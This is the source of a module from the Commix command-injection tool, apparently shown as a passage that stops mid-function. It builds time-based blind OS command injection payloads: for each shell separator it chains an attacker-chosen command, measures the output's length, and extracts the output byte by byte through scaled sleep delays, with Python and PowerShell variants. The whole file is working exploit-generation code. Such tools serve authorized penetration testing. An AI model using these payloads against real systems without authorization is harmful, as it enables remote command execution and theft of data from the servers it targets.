#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import re
import random
from src.utils import settings
from src.core.controller import checks

"""
The "time-based" injection technique on Blind OS Command Injection.
The available "time-based" payloads.
"""

"""
The command's output as a shell word, through whichever substitution syntax is in play. Wrapped in
nothing else: a second substitution around it nests, which backticks cannot do without escaping,
and an 'echo' in between reads the backslashes of the output on every shell whose builtin does.
"""
def _output_word(cmd):
  return settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX

"""
How many bytes that output is. Counted the same way on every separator, and read back below the same
way: '${#var}' counts characters where this counts bytes, and a length that disagreed with the
indexing would have the retrieval ask for characters that are not where it was told they are.
"""
def _length_expr(word):
  return "$(printf '%s' \"" + word + "\" | wc -c)"

"""
The same count, handed to 'awk' as an argument instead of carried in a variable. A separator that
backgrounds what it chains - '&' - cannot pass '${#var}' on to the command after it, and the two
ways around that both reach for an operator the payload is not proving: '&&' to hold the variable,
or a pipe into 'wc'. Asked this way the whole measurement is one command, so nothing is chained at
all. Counted in characters, as '${#var}' counts, so the branches that use either agree.

Nesting one substitution inside another is what this costs, which backticks cannot express without
escaping - so the caller keeps to its own shape where those are in play.
"""
def _length_arg_expr(word):
  """
  >>> "|" in _length_arg_expr("WORD")
  False
  >>> _length_arg_expr("WORD").startswith(settings.CMD_SUB_PREFIX + "LC_ALL=C awk ")
  True
  >>> "WORD" in _length_arg_expr("WORD")
  True
  """
  return (settings.CMD_SUB_PREFIX + "LC_ALL=C awk 'BEGIN{print(length(ARGV[1]))}' \"" + word + "\"" +
          settings.CMD_SUB_SUFFIX)

"""
The ordinal of the output's Nth byte, newlines counted among them. 'cut -c' would answer per line
instead, which is a different byte on any output that has more than one - and none at all for the
lines that are shorter than N.

The byte is counted rather than read as a character: counted, a newline is a number like any other,
where read it would be dropped along with the newlines a substitution ends with and the position it
sits at could never be resolved. The count is unsigned, so the whole byte survives it, and it is one
command on the end of the pipe the payload is already proving - no second statement to part.
"""
def _ordinal_expr(word, num_of_chars):
  # '+' rather than a bare '+', which arrives as a space - and 'tail -c N' counts from the end.
  return (settings.CMD_SUB_PREFIX + "printf '%s' \"" + word + "\" | tail -c +" + str(num_of_chars) +
          " | head -c 1 | od -A n -t u1" + settings.CMD_SUB_SUFFIX)

"""
The interpreter reads the output as an argument of its own rather than off a pipe. It is still data
either way - never text spliced into the program's own source, so a quote in it closes nothing -
and a pipe would be an operator the payload is not proving. The program's own statements are parted
by a carriage return, which the interpreter reads as a line break and a filter does not read at all.

'os.fsencode' puts the bytes back exactly as they arrived, surrogates and all, so this counts the
same bytes the pipe did - and the same ones the ordinal below indexes.
"""
def _py_source(statements):
  return "\"" + settings.END_LINE.CR.join(statements) + "\""

def _py_call(cmd, statements):
  return (settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c " +
          _py_source(statements) + " \"" + _output_word(cmd) + "\"" + settings.CMD_SUB_SUFFIX)

"""
The command's output, measured by the alternative interpreter.
"""
def _py_length_expr(cmd):
  return _py_call(cmd, ("import os,sys", "print(len(os.fsencode(sys.argv[1])))"))

"""
The command's output, saved to a file by the alternative interpreter - the tempfile-based
technique's own write step.
"""
def _py_write_expr(cmd, output_file):
  return _py_call(cmd, ("import os,sys",
                        "open('" + output_file + "','wb').write(os.fsencode(sys.argv[1]))"))

"""
The ordinal of that output's Nth byte. Indexing bytes answers with the number itself, so nothing
has to be converted afterwards.
"""
def _py_ordinal_expr(cmd, num_of_chars):
  return _py_call(cmd, ("import os,sys",
                        "print(os.fsencode(sys.argv[1])[" + str(num_of_chars - 1) + "])"))

"""
The ordinal of that output's Nth byte, taken by awk as an argument rather than off two pipes. Read
the same way as the count beside it, so the position asked for is the position indexed.

A letter is concatenated onto the byte, and only the first of the two is read: a substitution drops
the newlines it ends with, so a byte that is itself a newline would otherwise come back as nothing.
The parentheses stand in for the space awk's own concatenation would need, which the whitespace
substitution would eat inside the quoted program.
"""
def _ordinal_arg_expr(word, num_of_chars):
  """
  >>> "|" in _ordinal_arg_expr("WORD", 3)
  False
  >>> "substr(ARGV[1],3,1)" in _ordinal_arg_expr("WORD", 3)
  True
  """
  byte = (settings.CMD_SUB_PREFIX + "LC_ALL=C awk 'BEGIN{print((substr(ARGV[1]," + str(num_of_chars) +
          ",1))(\"X\"))}' \"" + word + "\"" + settings.CMD_SUB_SUFFIX)
  return checks.byte_ordinal_term(byte)

"""
The same condition written as arithmetic, or nothing where it is not one 'test' comparison of
numbers - which is all a payload builds, and all that can be scaled into a delay without a branch.
"""
_TEST_TO_ARITHMETIC = ((" -eq ", "=="), (" -ne ", "!="), (" -le ", "<="),
                       (" -lt ", "<"), (" -ge ", ">="), (" -gt ", ">"))

def _arithmetic_condition(condition):
  """
  >>> _arithmetic_condition("1 -eq 1")
  '1==1'
  >>> _arithmetic_condition("4 -le 5")
  '4<=5'
  >>> [_arithmetic_condition(_) for _ in ("-f /etc/passwd", "-n $VAR", "1 -eq $VAR")]
  [None, None, None]
  """
  expression = condition
  for test_form, arithmetic in _TEST_TO_ARITHMETIC:
    expression = expression.replace(test_form, arithmetic)
  return expression if re.match(r"\A[\d\s<>=!]+\Z", expression) else None

"""
The whole measurement as one command: the delay is scaled by the comparison itself, so there is
nothing to chain and no operator beyond the separator under test ever reaches the payload. This is
what the ';' and newline branches already say with a variable between two commands - written here
without one, for the separators that cannot carry a variable from one command to the next.
"""
def _timed_comparison(timesec, expected, length_expr, comparison="=="):
  return ("sleep $((" + str(timesec) + "*(" + str(expected) + comparison + length_expr + ")))")

# The same, delayed by the alternative interpreter rather than by 'sleep'.
def _py_timed_comparison(timesec, expected, length_expr, comparison="=="):
  delay = "time.sleep($((" + str(timesec) + "*(" + str(expected) + comparison + length_expr + "))))"
  return (settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c " +
          _py_source(("import time", delay)) + settings.CMD_SUB_SUFFIX)

"""
Time-based decision payload (check if host is vulnerable).
"""
def decision(separator, TAG, output_length, timesec, http_request_method):
  payload = ""
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is not None:
      # Comparing the marker straight back proves the command ran just as well as measuring its
      # length did, and spares the payload a PowerShell launch whose own start-up time is noise a
      # timing measurement cannot afford.
      payload = checks.windows_probe(chain, "echo " + TAG, "==", TAG, timesec)
  elif settings.SKIP_SUBST and separator in (";", "\n", "\r\n", "&"):
    """
    Nothing computed at all: the delay itself is the only thing being measured, so nothing here
    needs '$(...)' or a backtick to survive a filter that blocks both outright. This gives up the
    length check the payload otherwise builds in - "did it wait this long" is cruder than "did it
    wait exactly as long as this output's length says it should" - but it is the only oracle left
    once neither substitution syntax gets through, and both of these separators run what follows
    them regardless of what came before, so the delay is unconditional here either way.
    """
    payload = separator + "sleep " + str(timesec)
  else:
    if separator in (";", "\n", "\r\n"):
      payload = (separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output.
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                 "sleep $((" + str(timesec) + "*(" + str(output_length) + "==$" + settings.RANDOM_VAR_GENERATOR + "1)))"
                 )
    elif separator in ("&", "&&") and checks.substitution_nests():
      """
      Measured and delayed on in the one command, so neither of these has to chain anything.

      A number read straight back, rather than the length of the marker: the shell has to run the
      substitution for the two sides to match, which is what the length check proved too, and this
      asks nothing of the target beyond its own 'echo'. Detection is where that matters - a shell
      without 'awk' would otherwise answer nothing here, and answering nothing reads as not
      injectable rather than as a tool that could not ask.
      """
      marker = random.randint(10000, 99999)
      payload = (separator +
                 "sleep $((" + str(timesec) + "*(" + str(marker) + "==" +
                 _output_word("echo " + str(marker)) + ")))"
                 )
    elif separator == "&":
      # Backticks cannot nest, so the measurement is carried in a variable here - which '&' cannot
      # hand on to the command after it, leaving the '&&' below to hold it.
      payload = (separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX + "&&" +
                 "[ " + str(output_length) + " -eq ${#" + settings.RANDOM_VAR_GENERATOR + "} ]" + "&&" +
                 "sleep " + str(timesec)
                 )
    elif separator == "&&" :
      ampersand = "&"
      payload = (ampersand +
                 "sleep 0 " + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output.
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                 "[ " + str(output_length) + " -eq $" + settings.RANDOM_VAR_GENERATOR + "1 ]" + separator +
                 "sleep " + str(timesec)
                 )


    elif separator in ("|", "||"):
      pipe = "|"
      payload = (pipe +
                 "[ " + str(output_length) + " -ne " + _length_expr(TAG) + " ]" + "||" +
                 "sleep " + str(timesec)
                 )
    else:
      pass

    payload = checks.terminate_payload(payload, separator)

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def decision_alter_interpreter(separator, TAG, output_length, timesec, http_request_method):
  payload = ""
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is not None:
      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\""
      payload = checks.windows_probe(chain, python_payload, "==", output_length, timesec)

  else:
    if separator in (";", "\n", "\r\n"):
      payload = (separator +
                 # Find the length of the output, using readline().
                 settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\"" + settings.CMD_SUB_SUFFIX + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep($((" + str(timesec) + "*(" + str(output_length) + "==${" + settings.RANDOM_VAR_GENERATOR + "1}))))\"" + settings.CMD_SUB_SUFFIX
                 )
    elif separator in ("&", "&&") and checks.substitution_nests():
      payload = separator + _py_timed_comparison(timesec, output_length,
                  settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len('" + TAG + "'))\"" + settings.CMD_SUB_SUFFIX)
    elif separator == "&":
      payload = (separator +
                 # Find the length of the output, using readline().
                 "[ " + str(output_length) + " -eq " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\"" + settings.CMD_SUB_SUFFIX + " ]" + "&&" +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                 )

    elif separator == "&&" :
      ampersand = "&"
      payload = (ampersand + settings.SINGLE_WHITESPACE +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output, using readline().
                 settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\"" + settings.CMD_SUB_SUFFIX + separator +
                 "[ " + str(output_length) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ] " + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                 )


    elif separator in ("|", "||"):
      pipe = "|"
      payload = (pipe +
                 # Find the length of the output, using readline().
                 "[ " + str(output_length) + " -ne " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\") ] " + "||" +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(0)\") " + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                 )
    else:
      pass

    payload = checks.terminate_payload(payload, separator)

  payload = checks.sanitize_payload_newlines(payload)

  return payload

"""
Build a raw shell numeric comparison for false-positive checks; Unix-only.
"""
def condition_check(separator, condition, timesec, http_request_method):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    return None
  if settings.SKIP_SUBST and separator in (";", "\n", "\r\n", "&"):
    """
    An 'if'/'then'/'fi' block branches on a real exit status using nothing but 'test' and a
    statement terminator - where '[ condition ]' followed by reading '$?' needs a ']' and a '$',
    both of which a filter that blocks command substitution outright is just as likely to block
    too. ';', '\n' and '\r\n' all terminate a statement on their own, so the separator under test
    is what glues 'if' to 'then' to 'fi' for those three - nothing else belongs in a payload built
    to prove that one of them, specifically, is what chains commands here. '&' backgrounds rather
    than terminates, and cannot glue the block together itself; a newline is the one thing every
    one of 'then' and 'fi' needs regardless, so it is the fallback for that case alone.
    """
    glue = separator if separator in (";", "\n", "\r\n") else settings.END_LINE.LF
    payload = (separator + "if test " + condition + glue +
               "then sleep " + str(timesec) + glue + "fi")
  elif separator in (";", "\n", "\r\n"):
    payload = (separator +
              "[ " + condition + " ]" + separator +
              settings.RANDOM_VAR_GENERATOR + "=$?" + separator +
              "sleep $((" + str(timesec) + "*(" + settings.RANDOM_VAR_GENERATOR + "==0)))"
              )
  elif separator in ("&", "&&") and checks.substitution_nests() \
       and _arithmetic_condition(condition) is not None:
    payload = separator + "sleep $((" + str(timesec) + "*(" + _arithmetic_condition(condition) + ")))"
  elif separator == "&":
    payload = (separator +
              "[ " + condition + " ]" + "&&" +
              "sleep " + str(timesec)
              )
  elif separator in ("&", "&&", ""):
    payload = ("&" +
              "sleep 0" + separator +
              "[ " + condition + " ]" + separator +
              "sleep " + str(timesec)
              )
  elif separator in ("|", "||"):
    pipe = separator
    payload = (pipe +
              "[ ! " + condition + " ]" + "||" +
              "sleep " + str(timesec)
              )
  else:
    return None

  payload = checks.terminate_payload(payload, separator)

  return checks.sanitize_payload_newlines(payload)

"""
Windows counterpart of condition_check() above - 'set /a' has no boolean test operator, so an
equality check is read off a subtraction landing on the expected value.
"""
def windows_condition_check(separator, expr, expected, timesec):
  chain = checks.windows_separator(separator)
  if chain is None:
    return None
  return checks.windows_probe(chain, "set /a " + expr, "==", expected, timesec)

"""
Execute shell commands on vulnerable host.
"""
def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
  payload = ""
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is not None:
      payload = checks.windows_probe(chain, cmd, "==", output_length, timesec)

  else:
    settings.USER_APPLIED_CMD = cmd
    word = _output_word(cmd)
    if separator in (";", "\n", "\r\n"):
      payload = (separator +
                 # Counted in bytes, as the reading beside it indexes - exported, since a rewrite can move the counting into a command of its own.
                 settings.BYTE_LOCALE_EXPORTED + separator +
                 settings.RANDOM_VAR_GENERATOR + "=\"" + word + "\"" + separator +
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                 "sleep $((" + str(timesec) + "*(" + str(output_length) + "==$" + settings.RANDOM_VAR_GENERATOR + "1)))"
                )

    elif separator in ("&", "&&") and checks.substitution_nests():
      payload = separator + _timed_comparison(timesec, output_length, _length_arg_expr(word))
    elif separator == "&":
      # The "&&" this payload already carries holds the variable and the pin, where a pipe into "wc" would bring in an operator the separator under test is not.
      payload = (separator +
                 settings.BYTE_LOCALE_EXPORTED + "&&" +
                 settings.RANDOM_VAR_GENERATOR + "=\"" + word + "\"" + "&&" +
                 "[ " + str(output_length) + " -eq ${#" + settings.RANDOM_VAR_GENERATOR + "} ]" + "&&" +
                 "sleep " + str(timesec)
                )

    elif separator == "&&" :
      ampersand = "&"
      payload = (ampersand +
                 # The command the "&&" needs on its left, pinning while it is there.
                 settings.BYTE_LOCALE_EXPORTED + separator +
                 settings.RANDOM_VAR_GENERATOR + "=\"" + word + "\"" + separator +
                 # Find the length of the output.
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                 "[ " + str(output_length) + " -eq $" + settings.RANDOM_VAR_GENERATOR + "1 ]" + separator +
                 "sleep " + str(timesec)
                 )

    elif separator in ("|", "||"):
      pipe = "|"
      payload = (pipe +
                 "[ " + str(output_length) + " -ne " + _length_expr(word) + " ]" + "||" +
                 "sleep " + str(timesec)
                 )
    else:
      pass

    payload = checks.terminate_payload(payload, separator)

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def cmd_execution_alter_interpreter(separator, cmd, output_length, timesec, http_request_method):
  payload = ""
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is not None:
      payload = checks.windows_probe(chain, cmd, "==", output_length, timesec)

  else:
    settings.USER_APPLIED_CMD = cmd
    if separator in (";", "\n", "\r\n"):
      payload = (separator +
                 # Find the length of the output, using readline().
                 settings.RANDOM_VAR_GENERATOR + "1=" + _py_length_expr(cmd) + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep($((" + str(timesec) + "*(" + str(output_length) + "==${" + settings.RANDOM_VAR_GENERATOR + "1}))))\"" + settings.CMD_SUB_SUFFIX
                 )
    elif separator in ("&", "&&") and checks.substitution_nests():
      payload = separator + _py_timed_comparison(timesec, output_length, _py_length_expr(cmd))
    elif separator == "&":
      payload = (separator +
                 # Find the length of the output, using readline().
                 "[ " + str(output_length) + " -eq " + _py_length_expr(cmd) + " ]" + "&&" +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                 )

    elif separator == "&&" :
      ampersand = "&"
      payload = (ampersand +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(0)\") " + separator +
                 # Find the length of the output, using readline().
                 settings.RANDOM_VAR_GENERATOR + "1=" + _py_length_expr(cmd) + separator +
                 "[ " + str(output_length) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ] " + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\") "
                 )


    elif separator in ("|", "||"):
      pipe = "|"
      payload = (pipe +
                 # Find the length of the output, using readline().
                 "[ " + str(output_length) + " -ne " + _py_length_expr(cmd) + " ] " + "||" +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(0)\") " + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                 )
    else:
      pass

    payload = checks.terminate_payload(payload, separator)

  return checks.sanitize_payload_newlines(payload)

"""
Ordering (not equality) length check, so the output length can be binary searched.
"""
def get_length(separator, cmd, candidate_length, timesec, http_request_method):
  payload = ""
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is not None:
      payload = checks.windows_probe(chain, cmd, "GEQ", candidate_length, timesec)

  else:
    settings.USER_APPLIED_CMD = cmd
    word = _output_word(cmd)
    if separator in (";", "\n", "\r\n"):
      payload = (separator +
                 # Counted in bytes, as the reading beside it indexes - exported, since a rewrite can move the counting into a command of its own.
                 settings.BYTE_LOCALE_EXPORTED + separator +
                 settings.RANDOM_VAR_GENERATOR + "=\"" + word + "\"" + separator +
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                 "sleep $((" + str(timesec) + "*(" + str(candidate_length) + "<=$" + settings.RANDOM_VAR_GENERATOR + "1)))"
                )

    elif separator in ("&", "&&") and checks.substitution_nests():
      payload = separator + _timed_comparison(timesec, candidate_length, _length_arg_expr(word), "<=")
    elif separator == "&":
      # The "&&" this payload already carries holds the variable and the pin, where a pipe into "wc" would bring in an operator the separator under test is not.
      payload = (separator +
                 settings.BYTE_LOCALE_EXPORTED + "&&" +
                 settings.RANDOM_VAR_GENERATOR + "=\"" + word + "\"" + "&&" +
                 "[ " + str(candidate_length) + " -le ${#" + settings.RANDOM_VAR_GENERATOR + "} ]" + "&&" +
                 "sleep " + str(timesec)
                )

    elif separator == "&&" :
      ampersand = "&"
      payload = (ampersand +
                 # The command the "&&" needs on its left, pinning while it is there.
                 settings.BYTE_LOCALE_EXPORTED + separator +
                 settings.RANDOM_VAR_GENERATOR + "=\"" + word + "\"" + separator +
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                 "[ " + str(candidate_length) + " -le $" + settings.RANDOM_VAR_GENERATOR + "1 ]" + separator +
                 "sleep " + str(timesec)
                )

    elif separator in ("|", "||"):
      pipe = "|"
      payload = (pipe +
                 "[ " + str(candidate_length) + " -gt " + _length_expr(word) + " ]" + "||" +
                 "sleep " + str(timesec)
                )
    else:
      pass

    payload = checks.terminate_payload(payload, separator)

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def get_length_alter_interpreter(separator, cmd, candidate_length, timesec, http_request_method):
  payload = ""
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is not None:
      payload = checks.windows_probe(chain, cmd, "GEQ", candidate_length, timesec)

  else:
    settings.USER_APPLIED_CMD = cmd
    if separator in (";", "\n", "\r\n"):
      payload = (separator +
                 settings.RANDOM_VAR_GENERATOR + "1=" + _py_length_expr(cmd) + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep($((" + str(timesec) + "*(" + str(candidate_length) + "<=${" + settings.RANDOM_VAR_GENERATOR + "1}))))\"" + settings.CMD_SUB_SUFFIX
                 )
    elif separator in ("&", "&&") and checks.substitution_nests():
      payload = separator + _py_timed_comparison(timesec, candidate_length, _py_length_expr(cmd), "<=")
    elif separator == "&":
      payload = (separator +
                 "[ " + str(candidate_length) + " -le " + _py_length_expr(cmd) + " ]" + "&&" +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                 )
    elif separator == "&&" :
      ampersand = "&"
      payload = (ampersand +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(0)\") " + separator +
                 settings.RANDOM_VAR_GENERATOR + "1=" + _py_length_expr(cmd) + separator +
                 "[ " + str(candidate_length) + " -le ${" + settings.RANDOM_VAR_GENERATOR + "1} ] " + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\") "
                 )
    elif separator in ("|", "||"):
      pipe = "|"
      payload = (pipe +
                 "[ " + str(candidate_length) + " -gt " + _py_length_expr(cmd) + " ] " + "||" +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(0)\") " + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                 )
    else:
      pass

    payload = checks.terminate_payload(payload, separator)

  return checks.sanitize_payload_newlines(payload)

"""
Get the execution output, of shell execution.
"""
def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method, operator="-le"):
  payload = ""
  win_operator = "GEQ" if operator == "-le" else "EQU"
  inverted_operator = "-gt" if operator == "-le" else "-ne"
  arith_operator = "<=" if operator == "-le" else "=="
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is not None:
      # The ordinal has to be computed on the target: cmd.exe's IF compares strings by locale
      # collation ('M' GEQ 'a' holds), so only a numeric compare can be binary searched.
      payload = checks.windows_probe(chain,
                                     "powershell.exe -InputFormat none write "
                                     "([int][char](([string](cmd /c " + cmd + ")).trim().substring(" +
                                     str(num_of_chars - 1) + ",1)))",
                                     win_operator, ascii_char, timesec)

  else:
    settings.USER_APPLIED_CMD = cmd
    word = _output_word(cmd)
    qmarks = "?" * (num_of_chars - 1)
    var_ordinal_expr = checks.byte_ordinal("${" + settings.RANDOM_VAR_GENERATOR + "}")
    # Where the delay is scaled by the comparison, the reading goes in as a term of the arithmetic
    # already open rather than as one of its own - see checks.byte_ordinal_term().
    var_ordinal_term = checks.byte_ordinal_term("${" + settings.RANDOM_VAR_GENERATOR + "}")
    ordinal_expr = _ordinal_expr(word, num_of_chars)

    if separator in (";", "\n", "\r\n") :
      payload = (separator +
                # Sliced in bytes, as the length beside it counts - exported, since a rewrite can move the counting into a command of its own.
                settings.BYTE_LOCALE_EXPORTED + separator +
                # Grab the execution output.
                settings.RANDOM_VAR_GENERATOR + "=\"" + word + "\"" + separator +
                settings.RANDOM_VAR_GENERATOR + "=\"${" + settings.RANDOM_VAR_GENERATOR + "#" + qmarks + "}\"" + separator +
                settings.RANDOM_VAR_GENERATOR + "=\"${" + settings.RANDOM_VAR_GENERATOR + "%\"${" + settings.RANDOM_VAR_GENERATOR + "#?}\"}\"" + separator +
                "sleep $((" + str(timesec) + "*(" + str(ascii_char) + arith_operator + var_ordinal_term + ")))"
                )

    elif separator in ("&", "&&") and checks.substitution_nests():
      payload = separator + _timed_comparison(timesec, ascii_char,
                  _ordinal_arg_expr(word, num_of_chars), arith_operator)
    elif separator == "&":
      # The "&&" this payload already carries holds the variable and the pin, where a pipe into "wc" would bring in an operator the separator under test is not.
      payload = (separator +
                settings.BYTE_LOCALE_EXPORTED + "&&" +
                settings.RANDOM_VAR_GENERATOR + "=\"" + word + "\"" + "&&" +
                settings.RANDOM_VAR_GENERATOR + "=\"${" + settings.RANDOM_VAR_GENERATOR + "#" + qmarks + "}\"" + "&&" +
                settings.RANDOM_VAR_GENERATOR + "=\"${" + settings.RANDOM_VAR_GENERATOR + "%\"${" + settings.RANDOM_VAR_GENERATOR + "#?}\"}\"" + "&&" +
                "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + operator + settings.SINGLE_WHITESPACE + var_ordinal_expr + " ]" + "&&" +
                "sleep " + str(timesec)
                )

    elif separator == "&&" :
      ampersand = "&"
      payload = (ampersand +
                # The command the "&&" needs on its left, pinning while it is there.
                settings.BYTE_LOCALE_EXPORTED + separator +
                # Grab the execution output.
                settings.RANDOM_VAR_GENERATOR + "=\"" + word + "\"" + separator +
                settings.RANDOM_VAR_GENERATOR + "=\"${" + settings.RANDOM_VAR_GENERATOR + "#" + qmarks + "}\"" + separator +
                settings.RANDOM_VAR_GENERATOR + "=\"${" + settings.RANDOM_VAR_GENERATOR + "%\"${" + settings.RANDOM_VAR_GENERATOR + "#?}\"}\"" + separator +
                # Perform the time-based comparisons
                "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + operator + settings.SINGLE_WHITESPACE + var_ordinal_expr + " ] " + separator +
                "sleep " + str(timesec)
                )

    elif separator in ("|", "||"):
      pipe = "|"
      payload = (pipe +
                "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + inverted_operator + settings.SINGLE_WHITESPACE + ordinal_expr + " ]" + "||" +
                "sleep " + str(timesec)
                )
    else:
      pass

    payload = checks.terminate_payload(payload, separator)

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def get_char_alter_interpreter(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method, operator="-le"):
  payload = ""
  win_operator = "GEQ" if operator == "-le" else "EQU"
  inverted_operator = "-gt" if operator == "-le" else "-ne"
  arith_operator = "<=" if operator == "-le" else "=="
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is not None:
      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"import os; print(ord(os.popen('" + cmd + "').read().strip()[" + str(num_of_chars-1) + ":" + str(num_of_chars) + "]))\""
      payload = checks.windows_probe(chain, python_payload, win_operator, ascii_char, timesec)

  else:
    settings.USER_APPLIED_CMD = cmd
    if separator in (";", "\n", "\r\n"):
      payload = (separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + _py_ordinal_expr(cmd, num_of_chars) + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep($((" + str(timesec) + "*(" + str(ascii_char) + arith_operator + "${" + settings.RANDOM_VAR_GENERATOR + "}))))\"" + settings.CMD_SUB_SUFFIX
                 )

    elif separator in ("&", "&&") and checks.substitution_nests():
      payload = separator + _py_timed_comparison(timesec, ascii_char,
                  _py_ordinal_expr(cmd, num_of_chars), arith_operator)
    elif separator == "&":
      payload = (separator +
